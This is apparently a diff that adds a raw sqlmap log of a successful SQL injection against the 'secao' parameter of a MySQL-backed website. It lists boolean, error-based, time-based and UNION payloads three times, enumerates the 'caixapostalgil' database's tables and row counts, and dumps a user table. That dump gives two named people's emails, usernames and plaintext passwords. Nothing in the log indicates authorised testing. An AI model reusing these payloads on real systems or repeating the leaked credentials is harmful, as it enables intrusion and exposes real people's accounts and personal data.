@@ -1,0 +1,140 @@
+sqlmap identified the following injection point(s) with a total of 68 HTTP(s) requests:
+---
+Parameter: secao (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=2110&secao=9 AND 2479=2479
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=2110&secao=9 AND (SELECT 6556 FROM(SELECT COUNT(*),CONCAT(0x717a766b71,(SELECT (ELT(6556=6556,1))),0x7178786a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=2110&secao=9 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 24 columns
+    Payload: id=2110&secao=9 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a766b71,0x6c65794b41634674505648765579695443694572726f4b62486c5063735270594f4a6b6a61545865,0x7178786a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- fppt
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] caixapostalgil
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: secao (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=2110&secao=9 AND 2479=2479
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=2110&secao=9 AND (SELECT 6556 FROM(SELECT COUNT(*),CONCAT(0x717a766b71,(SELECT (ELT(6556=6556,1))),0x7178786a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=2110&secao=9 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 24 columns
+    Payload: id=2110&secao=9 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a766b71,0x6c65794b41634674505648765579695443694572726f4b62486c5063735270594f4a6b6a61545865,0x7178786a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- fppt
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: caixapostalgil
+[20 tables]
++-----------------------+
+| acessos               |
+| acessos_online        |
+| acessos_top           |
+| comentarios           |
+| comentarios_contador  |
+| contato               |
+| contato_resposta      |
+| enquete_questoes      |
+| enquete_votos         |
+| entrevistas_emissoras |
+| entrevistas_programas |
+| fotos                 |
+| fotos_galeria         |
+| gilberto_braga        |
+| links                 |
+| links_categorias      |
+| menu                  |
+| programas             |
+| secao                 |
+| usuarios              |
++-----------------------+
+
+Database: caixapostalgil
++-----------------------+---------+
+| Table                 | Entries |
++-----------------------+---------+
+| gilberto_braga        | 2103    |
+| contato_resposta      | 162     |
+| contato               | 152     |
+| acessos               | 123     |
+| acessos_top           | 123     |
+| fotos                 | 81      |
+| comentarios           | 52      |
+| comentarios_contador  | 49      |
+| programas             | 43      |
+| entrevistas_programas | 42      |
+| links                 | 30      |
+| fotos_galeria         | 21      |
+| entrevistas_emissoras | 12      |
+| menu                  | 10      |
+| secao                 | 10      |
+| links_categorias      | 7       |
+| acessos_online        | 2       |
+| usuarios              | 2       |
+| enquete_questoes      | 1       |
+| enquete_votos         | 1       |
++-----------------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: secao (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=2110&secao=9 AND 2479=2479
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=2110&secao=9 AND (SELECT 6556 FROM(SELECT COUNT(*),CONCAT(0x717a766b71,(SELECT (ELT(6556=6556,1))),0x7178786a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: id=2110&secao=9 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 24 columns
+    Payload: id=2110&secao=9 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a766b71,0x6c65794b41634674505648765579695443694572726f4b62486c5063735270594f4a6b6a61545865,0x7178786a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- fppt
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: caixapostalgil
+Table: usuarios
+[2 entries]
++---------------------+------------+----------+----------------------+--------------+----------+---------+---------+---------------------+-----------------+
+| nome                | data       | senha    | email                | funcao       | usuario  | cod_usu | visitas | ultimo_acesso       | nivel_gerencial |
++---------------------+------------+----------+----------------------+--------------+----------+---------+---------+---------------------+-----------------+
+| EDSON RICARDO PINHO | 2008-12-05 | designer | erpinho@yahoo.com.br | Analista Web | erpinho  | 1       | 1097    | 2019-03-28 13:31:55 | 1               |
+| GILBERTO BRAGA      | 2008-12-07 | 12345678 | gilbraga@gmail.com   | Professor    | gilbraga | 2       | 1455    | 2019-03-29 07:56:56 | 2               |
++---------------------+------------+----------+----------------------+--------------+----------+---------+---------+---------------------+-----------------+
+
